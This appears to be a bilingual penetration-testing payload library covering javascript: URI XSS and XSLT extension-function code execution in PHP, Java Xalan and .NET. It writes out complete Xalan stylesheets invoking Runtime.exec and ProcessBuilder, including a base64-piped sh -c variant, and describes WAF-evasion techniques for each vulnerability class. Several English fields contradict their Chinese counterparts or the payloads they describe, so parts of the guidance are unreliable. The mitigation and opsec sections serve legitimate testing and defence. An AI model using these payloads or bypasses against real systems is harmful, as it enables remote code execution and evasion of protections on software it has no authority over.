name.zh: javascript: URI location 赋值变体

description.zh: 验证用户可控链接或跳转目标是否允许 javascript: 协议进入可执行浏览器上下文，并造成脚本执行或导航劫持。
description.en: Tests whether a user-controlled link or navigation target permits the javascript scheme to reach an executable browser context and trigger script execution or navigation takeover.

overview.zh: 覆盖 javascript: 危险协议进入可执行上下文的验证：以 javascript: URI 变体作用于 href、location 等可执行 Sink，浏览器实际跳转至收集端即确认对应赋值形式可被触发。
overview.en: Covers verification of the javascript: dangerous scheme entering executable contexts: javascript: URI variants against executable sinks like href and location, with the browser actually jumping to your collector confirming the assignment form is triggerable.

vulnerability.zh: 根因是应用只校验字符串前缀或目标域，未在统一解码后按协议白名单重新解析 URL；模板转义无法阻止危险协议语义，框架路由与 DOM 赋值差异可能让服务端检查与客户端执行不一致。
vulnerability.en: The root cause is applications validating string prefixes or target domains without re-parsing URLs against protocol allowlists after unified decoding; template escaping cannot neutralize dangerous scheme semantics, and framework-routing versus DOM-assignment differences may desync server checks from client execution.

exploitation.zh: 使用第 1 步命令逐行以 javascript: URI 变体把页面导航到收集端；浏览器实际跳转至 {ATTACKER_HOST} 即确认对应 location 赋值形式可被 URI 触发。先用 https://example.test 建立正常链接与导航基线，再在开发者工具记录最终 DOM 属性、实际协议与脚本副作用，并在纯文本与禁脚本环境复测。
exploitation.en: Use the step 1 command to navigate the page to your collector via javascript: URI variants line by line; the browser actually jumping to {ATTACKER_HOST} confirms the corresponding location assignment form is triggerable by the URI. Baseline normal links and navigation with https://example.test first, then record final DOM attributes, actual protocols, and script side effects in DevTools, retesting in plain-text and script-disabled contexts.

mitigation.zh: 统一解码并使用标准 URL 解析器，只允许明确的 http/https 等业务协议并拒绝 javascript、data 与未知协议；在危险 DOM Sink 前执行上下文校验，部署严格 CSP 并保留浏览器回归。
mitigation.en: Decode uniformly with standard URL parsers, allowing only explicit business protocols like http/https while rejecting javascript, data, and unknown schemes; run contextual validation before hazardous DOM sinks, deploy strict CSP, and keep browser regressions.

description.zh: 确认输入最终进入链接、location 或其他由浏览器解释协议的属性，而不是普通文本节点。
description.en: Confirm that input reaches a link, location, or another browser-interpreted URI property rather than a plain-text node.

title.zh: 回放 JavaScript URI 集合

description.zh: 提交原始协议变体并记录浏览器解析后的属性值、CSP 决策以及可观察脚本副作用。
description.en: Submit the original scheme variants and record the browser-resolved property, CSP decision, and observable script side effect.

description.zh: 应用标准 URL 解析和协议白名单后重放，确认正常 HTTPS 链接保留而危险协议被拒绝。
description.en: Replay after standard URL parsing and scheme allowlisting to confirm normal HTTPS links remain while dangerous schemes are rejected.

review.rationale: 原命令的最终 Sink 是浏览器 URI 执行，应从 SQL 注入改归 XSS，而不是仅按导航效果归开放重定向。

prerequisites.zh: 可控值进入 href、location 或等价可导航 Sink，应用未在最终赋值前拒绝 javascript:，且目标浏览器上下文允许该协议执行。
prerequisites.en: A controllable value reaches href, location, or another navigable sink without final rejection of javascript:, and the target browser context permits the scheme to execute.

prerequisites.zh: 使用隔离页面和仅设置一次性内存 marker 的 javascript: URI，启用导航 API、CSP 和事件调用栈跟踪，不访问外部域。
prerequisites.en: An isolated page uses a javascript: URI that sets a one-time in-memory marker only, with navigation APIs, CSP, and event stacks traced and no external origin contacted.

analysis.zh: 阳性证据是应用真实赋值或用户测试点击使可控 javascript: 在页面来源下执行 marker，输入、DOM 属性、触发事件和调用栈完整关联。 假阳性边界：URI 仅显示为文本、浏览器/CSP 阻断、链接未触发、普通 HTTPS 跳转、地址栏手工执行或安全扫描器匹配协议字符串均不是执行。
analysis.en: Positive evidence requires a real application assignment or test click to execute the controlled javascript: marker under the page origin, correlating input, DOM attribute, trigger event, and call stack. False-positive boundary: A URI displayed as text, browser or CSP blocking, an untriggered link, ordinary HTTPS navigation, manual address-bar execution, or scanner string matching does not prove execution.

opsecTips.zh: JavaScript URI 测试禁止访问 cookie/storage 或跳到公共域；出现顶层导航、窗口打开、用户数据读取、外连或非测试会话时停止。
opsecTips.en: JavaScript URI testing never accesses cookies or storage or navigates to public origins; stop on top-level navigation, window opening, user-data reads, egress, or a non-test session.

opsecTips.zh: 删除测试链接和 marker，恢复 href/location 值，清理 history、BFCache 与站点数据，并重载确认协议不再触发。
opsecTips.en: Delete test links and markers, restore href or location values, clear history, BFCache, and site data, and reload to confirm the scheme no longer triggers.

description.zh: 绕过 javascript: 关键字检测：scheme 中字母实体化。判据：浏览器解码后跳转至 {ATTACKER_HOST}。
description.en: Entity-encodes a letter of the scheme to dodge keyword rules. Success: browser redirects to the attacker host.

description.zh: 绕过整串 javascript 匹配：scheme 中插入换行实体，浏览器规范化时剔除。判据：跳转成功。
description.en: Embeds a newline entity inside the scheme; browsers strip it during URL parsing. Success: redirection occurs.

description.zh: 绕过 location= 特征与页面返回值渲染差异。判据：当前页跳转至目标。
description.en: Wraps the assignment in void() to alter the signature. Success: page navigates to the target.

description.zh: 绕过对 https://attacker 明文跳转的检测：目标以编码形态传递再解码。判据：跳转成功。
description.en: Passes the destination encoded and decodes at runtime. Success: navigation to attacker host.

name.zh: PHP XSLT 扩展函数代码执行

description.zh: 验证 PHP XSL 处理器是否允许不受信任样式表调用 php:function，并把 system 等进程函数暴露为远程代码执行 Sink。
description.en: Tests whether a PHP XSL processor allows an untrusted stylesheet to invoke php:function and exposes process functions such as system as a remote-code-execution sink.

overview.zh: PHP XSLT 扩展函数代码执行针对不受信任样式表调用 php:function 的场景：system 等进程函数被暴露为转换期 Sink。验证含 PHP 命名空间的样式表能否在转换时执行宿主命令。
overview.en: PHP XSLT extension-function code execution targets untrusted stylesheets calling php:function, exposing process functions like system as transform-time sinks. It validates whether a stylesheet with the PHP namespace can execute host commands during transformation.

vulnerability.zh: 若服务端把上传或拼接的 XSLT 当作可信代码执行并启用 registerPHPFunctions，样式表表达式可跨越数据转换边界调用 system；仅解析 XML 并不等于执行，根因是扩展函数暴露与不可信样式表共存。
vulnerability.en: If the server executes uploaded or spliced XSLT as trusted code with registerPHPFunctions enabled, stylesheet expressions can cross the data-transformation boundary to call system; parsing XML alone is not execution—the root cause is extension-function exposure coexisting with untrusted stylesheets.

exploitation.zh: 按第 1 步提交含 xmlns:php 命名空间与 php:function('system','id') 的完整样式表到目标转换入口；命中判据为转换输出包含 uid= 的命令结果。确认执行后可把函数参数替换为标记命令形成证据；若无输出，依次排查 registerPHPFunctions 是否启用、样式表是否被完整接受与转换进程权限，三项缺一即不成立。
exploitation.en: Per step 1, submit the complete stylesheet with the xmlns:php namespace and php:function('system','id') to the target transform entry; a hit is uid= command output in the transform result. Once execution is confirmed, swap function arguments for marker commands as evidence; without output, check in turn whether registerPHPFunctions is enabled, whether the stylesheet was fully accepted, and transform-process permissions—any missing means the chain fails.

mitigation.zh: 禁止用户控制可执行样式表；关闭 PHP XSL 扩展函数注册并采用无扩展的受限处理器；以低权限隔离转换进程、限制文件与网络访问，并对允许的模板做完整性校验。修复后重放第 1 步样式表，确认 php:function 被拒绝且正常转换可用。
mitigation.en: Forbid user-controlled executable stylesheets; disable PHP XSL extension-function registration and use a restricted extension-free processor; isolate transform processes with low privilege, restrict file and network access, and verify template integrity. After the fix, replay the step-1 stylesheet and confirm php:function is rejected while normal transforms work.

title.zh: 确认 PHP XSL 扩展面
title.en: Confirm the PHP XSL extension surface

description.zh: 使用无副作用样式表确定处理器类型、PHP 函数注册状态和转换服务账号边界。
description.en: Use a side-effect-free stylesheet to identify the processor, PHP function registration, and transform service-account boundary.

description.zh: 提交原始 PHP XSLT 集合并从进程审计与转换输出确认宿主函数确实被调用。
description.en: Submit the original PHP XSLT set and confirm actual host-function invocation from process auditing and transform output.

description.zh: 禁用扩展函数并降低运行权限后重放，确认合法数据转换仍工作且系统命令不再产生。
description.en: Replay after disabling extensions and reducing runtime privileges to confirm valid transformation remains while system commands disappear.

review.rationale: php:function 调用宿主 system 是明确的 XSLT 到操作系统执行链，应归 RCE。

prerequisites.zh: 攻击者样式表进入 PHP XSLTProcessor，处理器允许 registerPHPFunctions 或等价函数桥，PHP/XSL 版本和允许函数列表可核验。
prerequisites.en: An attacker stylesheet reaches PHP XSLTProcessor with registerPHPFunctions or an equivalent bridge enabled, and PHP or XSL versions plus allowed functions are verifiable.

prerequisites.zh: 注册只返回固定 canary 的测试 PHP 函数并跟踪 php:function resolution；原 system/id/whoami/文件读取样式表只离线保留。
prerequisites.en: A test PHP function returning only a fixed canary is registered and php:function resolution traced, while source system, id, whoami, and file-read stylesheets remain offline.

analysis.zh: 阳性证据是目标 XSLT 转换解析 php:function 并由宿主调用测试 PHP 函数产生 canary，stylesheet 哈希、函数调用栈与转换任务对应。 假阳性边界：PHP namespace被解析、样式表编译成功、函数桥禁用/未注册、system 字符串回显、XPath 错误或本地不同配置执行均不是目标 RCE。
analysis.en: Positive evidence requires the target transformation to resolve php:function and have the host invoke the test PHP function to produce a canary, correlating stylesheet hash, function stack, and transform job. False-positive boundary: Parsed PHP namespaces, successful stylesheet compilation, a disabled or unregistered bridge, reflected system text, XPath errors, or execution under a different local configuration does not prove target RCE.

opsecTips.zh: 验证优先以返回固定 canary 的注册测试函数替代原 system 样式表；如需确认真实执行，仅提交 id 等只读命令；出现进程、文件/网络副作用、任意 PHP 函数访问、转换缓存污染或 worker 异常时立即停止。
opsecTips.en: PHP XSLT extension validation never executes source system commands; stop on processes, file or network effects, arbitrary PHP-function access, transform-cache contamination, or worker anomalies.

opsecTips.zh: 移除测试函数/stylesheet/canary，撤销 registerPHPFunctions，清理 XSLT/OPcache/任务缓存并重启隔离 PHP worker。
opsecTips.en: Remove test functions, stylesheets, and canaries, revoke registerPHPFunctions, clear XSLT, OPcache, and job caches, and restart isolated PHP workers.

description.zh: 绕过对 php:function('system' 精确匹配的 WAF：PHP 函数名大小写不敏感；成功判据：XSLT 渲染输出含 uid。
description.en: Bypasses exact matching of php:function('system' since PHP function names are case-insensitive. Success: XSLT output contains uid.

description.zh: 换用 shell_exec sink，规避仅拦截 system/passthru 的规则；成功判据：输出 uid 信息。
description.en: Switches the sink to shell_exec to evade rules blocking only system/passthru. Success: uid info in output.

description.en: Pipes a base64 command to evade plaintext command blacklists. Success: executes after decoding and echoes output.

description.en: XSLT PHP RCE contains multiple reproducible input samples; test them individually and record response and log differences. Success check: XSLT processing emits the command result of system/passthru/shell_exec (uid=...).

name.zh: Java Xalan XSLT 扩展代码执行
name.en: Java Xalan XSLT Extension Code Execution

description.zh: 验证 Java XSLT 处理器是否允许攻击者控制的命名空间映射到 Runtime 等宿主类，并从转换表达式调用进程执行。
description.en: Tests whether a Java XSLT processor lets attacker-controlled namespaces map to host classes such as Runtime and invoke process execution from a transform expression.

overview.zh: Java Xalan XSLT 扩展代码执行针对攻击者控制的命名空间映射到 Runtime 等宿主类的场景：转换表达式可调用进程执行。验证 Xalan 风格扩展命名空间能否在转换期启动命令。
overview.en: Java Xalan XSLT extension code execution targets attacker-controlled namespaces mapping to host classes like Runtime, letting transform expressions invoke process execution. It validates whether Xalan-style extension namespaces can launch commands during transformation.

vulnerability.zh: 应用若允许上传、覆盖或拼接 XSLT，并使用可反射调用 Java 类的方法解析扩展命名空间，数据转换模板便成为代码；处理器安全特性、类加载策略和服务账号权限共同决定影响，单独看到 Runtime 字符串不能证明调用发生。
vulnerability.en: If the application allows XSLT upload, overwrite, or splicing and resolves extension namespaces via methods that reflectively invoke Java classes, data-transformation templates become code; processor security features, class-loading policy, and service-account permissions jointly determine impact—seeing the Runtime string alone proves no invocation.

exploitation.zh: 按第 1 步提交映射 java.lang.Runtime 的扩展命名空间样式表，先以 getRuntime 与 exec('id') 组合验证调用链；命中判据为转换输出包含对应命令结果。确认执行后可替换为标记命令；无输出时依次确认处理器是否为 Xalan、扩展函数是否被安全模式禁用、不可信样式表是否真实参与转换，三者缺一则该链不适用于目标。
exploitation.en: Per step 1, submit the stylesheet mapping the java.lang.Runtime extension namespace, first validating the invocation chain with getRuntime and exec('id'); a hit is the corresponding command output in the transform result. Once confirmed, substitute marker commands; without output, confirm in turn that the processor is Xalan, extension functions are not disabled by secure processing, and the untrusted stylesheet genuinely participates in transformation—if any fails, the chain does not apply to the target.

mitigation.zh: 只执行受版本控制且签名的 XSLT；启用 JAXP 安全处理并禁止外部扩展函数与任意类解析；在无网络、只读文件系统和低权限账号中运行转换，同时监控异常子进程。修复后重放第 1 步样式表，确认扩展命名空间被拒绝。
mitigation.en: Execute only version-controlled, signed XSLT; enable JAXP secure processing and forbid external extension functions and arbitrary class resolution; run transforms without network, on read-only filesystems, under low-privilege accounts, and monitor anomalous child processes. After the fix, replay the step-1 stylesheet and confirm the extension namespace is rejected.

title.zh: 识别 Xalan 与安全模式

description.zh: 先确认实际 Java 转换实现、扩展命名空间支持和 secure-processing 配置状态。
description.en: Identify the actual Java transform implementation, extension-namespace support, and secure-processing configuration.

title.zh: 执行 Runtime 扩展探针

description.zh: 提交原始 Xalan 样式表并关联转换响应、Java 子进程事件以及服务端审计记录。
description.en: Submit the original Xalan stylesheet and correlate the transform response, Java child-process events, and server audit records.

description.zh: 启用安全处理和扩展禁用策略后复测，确认正常 XSLT 输出保留但 Runtime 调用消失。
description.en: Retest with secure processing and extension blocking to confirm normal XSLT output remains while Runtime invocation disappears.

attackChain.payload: <?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"><xsl:template match="/"><xsl:variable name="r" select="rt:getRuntime()"/><xsl:value-of select="rt:exec($r,'id')"/></xsl:template></xsl:stylesheet>

review.rationale: 该条依赖 Xalan Java 扩展调用 Runtime，最终影响是宿主进程执行而非普通 XML 注入。

prerequisites.zh: 可控 stylesheet 由支持 Xalan Java 扩展命名空间的 JAXP Transformer 执行，secure processing 和扩展函数策略已确认。
prerequisites.en: A controlled stylesheet is executed by a JAXP Transformer supporting Xalan Java-extension namespaces, with secure-processing and extension-function policy confirmed.

prerequisites.zh: 隔离类路径提供只返回固定 canary 的测试静态方法，并跟踪命名空间到类/方法解析；Runtime.exec 源样例不执行。
prerequisites.en: An isolated classpath provides a test static method returning only a fixed canary and traces namespace-to-class and method resolution; source Runtime.exec samples are not executed.

analysis.zh: 阳性证据是目标 Xalan 处理器把攻击者命名空间映射到宿主测试类并调用方法产生 canary，TransformerFactory、类加载和调用栈相符。 假阳性边界：stylesheet 中存在 Runtime URI、处理器换成 Saxon/JDK 内置、secure-processing 拒绝扩展、类找不到、XPath 错误或命令文本回显均不是执行。
analysis.en: Positive evidence requires the target Xalan processor to map the attacker namespace to the host test class and invoke its method to produce a canary, with TransformerFactory, class loading, and call stack aligned. False-positive boundary: A Runtime URI in the stylesheet, use of Saxon or another processor, secure-processing rejection, a missing class, XPath errors, or reflected command text does not prove execution.

opsecTips.zh: 验证优先以返回固定 canary 的测试静态方法替代 Runtime/ProcessBuilder 样例；如需确认真实执行，仅提交 id 等只读命令；出现反射扩散、文件/网络访问、类加载异常或 JVM 不稳定时立即停止。
opsecTips.en: Java XSLT extension testing forbids Runtime, ProcessBuilder, and nontest classes; stop on processes, reflection expansion, file or network access, class-loading anomalies, or JVM instability.

opsecTips.zh: 销毁隔离 Transformer/JVM，删除测试类、stylesheet 与 canary，清理 TransformerFactory/模板缓存并恢复安全处理配置。
opsecTips.en: Destroy the isolated Transformer and JVM, delete test classes, stylesheets, and canaries, clear TransformerFactory and template caches, and restore secure-processing configuration.

wafBypass.command: <?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:pb="http://xml.apache.org/xalan/java/java.lang.ProcessBuilder"><xsl:template match="/"><xsl:variable name="p" select="pb:new('id')"/><xsl:value-of select="pb:start($p)"/></xsl:template></xsl:stylesheet>

description.zh: 用 Xalan 扩展函数走 ProcessBuilder 路径，绕过 Runtime.getRuntime().exec 特征；成功判据：输出含 uid。
description.en: Routes execution through an Xalan extension using ProcessBuilder, evading Runtime.getRuntime().exec signatures. Success: output contains uid.

wafBypass.command: <?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"><xsl:template match="/"><xsl:variable name="r" select="rt:getRuntime()"/><xsl:value-of select="rt:exec($r,'id')"/></xsl:template></xsl:stylesheet>

description.zh: 以变量中转 getRuntime() 结果再调用 rt:exec，避免 getRuntime().exec 连写特征；成功判据：进程创建可验证（以副作用确认，exec 返回对象不回显 stdout）。
description.en: Obtains Runtime via Class.forName reflection to evade direct getRuntime().exec pattern matching. Success: process creation is verifiable.

wafBypass.command: <?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:pb="http://xml.apache.org/xalan/java/java.lang.ProcessBuilder"><xsl:template match="/"><xsl:variable name="p" select="pb:new('sh','-c','echo aWQ=|base64 -d|sh')"/><xsl:value-of select="pb:start($p)"/></xsl:template></xsl:stylesheet>

description.zh: 命令经 sh -c base64 解码执行，规避命令明文；" 实体编码绕过引号检测；成功判据：命令输出回显。
description.en: Executes a base64 command via sh -c, with " entity encoding to bypass quote inspection. Success: command output reflected.

description.zh: 判据: 逐条提交样式表并记录转换输出与目标侧副作用。命中判据：rt:exec 调用成功以副作用验证（创建文件、外连监听器等）；xsl:value-of 对 exec 返回的 Process 对象只输出对象引用而非命令 stdout，不能以页面出现 uid= 作为判据。
description.en: XSLT Java RCE contains multiple reproducible input samples; test them individually and record response and log differences. Success check: the Xalan extension executes and emits the matching command result.

name.zh: .NET msxsl:script 代码执行

description.zh: 验证 .NET XSLT 转换是否接受攻击者提供的 msxsl:script 脚本块，并在宿主进程中编译执行 C# 代码。
description.en: Tests whether a .NET XSLT transformation accepts an attacker-provided msxsl:script block and compiles and executes C# code in the host process.

overview.zh: .NET msxsl:script 代码执行针对攻击者提供的 msxsl:script 脚本块被宿主编译执行的场景。验证支持脚本的 XSLT 引擎是否把 C# 代码块编译进宿主进程并执行。
overview.en: .NET msxsl:script code execution targets attacker-supplied msxsl:script blocks compiled and executed by the host. It validates whether a script-capable XSLT engine compiles the C# block into the host process and runs it.

vulnerability.zh: 如果应用将 XsltSettings.EnableScript 打开并允许外部提供样式表，脚本就绕过了数据转换边界，继承服务进程的文件、网络和进程权限；现代运行时可能直接拒绝脚本，必须区分功能不可用、编译失败与真正执行。
vulnerability.en: If the application enables XsltSettings.EnableScript and allows externally supplied stylesheets, scripts bypass the data-transformation boundary and inherit the service process's file, network, and process permissions; modern runtimes may reject scripts outright—distinguish feature unavailable, compile failure, and genuine execution.

exploitation.zh: 按第 1 步提交含 msxsl:script 与 xmlns:my 命名空间的完整样式表，脚本块内以 Process 启动命令并在模板中调用 user 函数；命中判据为转换时脚本内代码执行并输出命令结果。确认执行后可把命令替换为标记输出；无输出时核对 XslCompiledTransform 是否启用脚本设置与样式表是否完整参与转换，编译错误要单独记录。
exploitation.en: Per step 1, submit the complete stylesheet with msxsl:script and the xmlns:my namespace, launching a command via Process inside the script block and calling the user function from the template; a hit is the script code executing during transformation with command output. Once confirmed, swap commands for marker output; without output, check whether XslCompiledTransform has script settings enabled and whether the stylesheet fully participates in transformation—log compile errors separately.

mitigation.zh: 保持 XSLT 脚本功能关闭；只从受信仓库加载固定样式表并校验完整性；将转换放入低权限隔离进程，限制子进程、文件与网络能力并监控动态编译事件。修复后重放第 1 步样式表，确认脚本块被拒绝且正常转换可用。
mitigation.en: Keep XSLT scripting disabled; load fixed stylesheets only from trusted repositories with integrity checks; run transforms in low-privilege isolated processes, restricting child-process, file, and network capabilities, and monitor dynamic-compilation events. After the fix, replay the step-1 stylesheet and confirm script blocks are rejected while normal transforms work.

description.zh: 确认使用的转换 API、运行时版本以及脚本和文档函数是否被显式启用。
description.en: Confirm the transform API, runtime version, and whether script and document functions are explicitly enabled.

description.zh: 回放原始样式表并从动态编译、进程事件和转换输出证明脚本的实际执行。
description.en: Replay the original stylesheet and prove script execution through dynamic compilation, process events, and transform output.

description.zh: 关闭 EnableScript 并隔离运行权限后重放，确认合法转换可用且脚本块被稳定拒绝。
description.en: Replay after disabling EnableScript and isolating privileges to confirm valid transforms work and script blocks are consistently rejected.

review.rationale: msxsl:script 在启用脚本时编译并运行 C#，真实类别是 .NET XSLT RCE。

prerequisites.zh: 攻击者 XSLT 进入 .NET XslCompiledTransform，XsltSettings.EnableScript 为真且 msxsl:script 可由宿主编译，运行时版本可核验。
prerequisites.en: An attacker XSLT reaches .NET XslCompiledTransform with XsltSettings.EnableScript true and msxsl:script compilable by the host, with runtime version verifiable.

prerequisites.zh: 脚本块只定义返回固定 canary 的纯函数，跟踪 CodeDOM/脚本编译和扩展方法调用；原 Process/cmd.exe 样例不执行。
prerequisites.en: The script block defines only a pure function returning a fixed canary, with CodeDOM or script compilation and extension calls traced; source Process and cmd.exe samples are not executed.

analysis.zh: 阳性证据是目标转换器接受 msxsl:script、在宿主编译测试 C# 并从 XSLT 调用返回 canary，程序集、任务和调用栈连续关联。 假阳性边界：XML parser 接受 script 元素、EnableScript=false 抛错、仅编译 XSLT 不编译 C#、脚本代码出现在错误或另一 .NET 配置成功均不是 RCE。
analysis.en: Positive evidence requires the target transformer to accept msxsl:script, compile test C# in the host, and invoke it from XSLT to return a canary, correlating assembly, job, and call stack. False-positive boundary: XML acceptance of the script element, an EnableScript=false error, XSLT compilation without C# compilation, script code in errors, or success under another .NET configuration does not prove RCE.

opsecTips.zh: 验证优先以返回固定 canary 的纯函数脚本替代 Process 启动样例；如需确认真实执行，仅启动 cmd /c id 等只读命令；出现程序集落盘、文件/网络动作、AppDomain 异常或 worker 重启时立即停止。
opsecTips.en: .NET XSLT script testing never starts Process or accesses host APIs; stop on assemblies written to disk, processes, file or network actions, AppDomain anomalies, or worker restarts.

opsecTips.zh: 终止测试 AppDomain/worker，删除脚本 stylesheet、临时程序集和 canary，清理 XSLT 缓存并恢复 EnableScript=false。
opsecTips.en: Terminate the test AppDomain or worker, delete script stylesheets, temporary assemblies, and canaries, clear XSLT caches, and restore EnableScript=false.

description.en: Switches the script language from C# to JScript with fully-qualified calls, evading C# syntax and Process.Start signature pairs. Success: process launch observable.

description.en: Invokes Process.Start via reflection with a concatenated name, defeating source-level keyword scanning. Success: command output reflected.
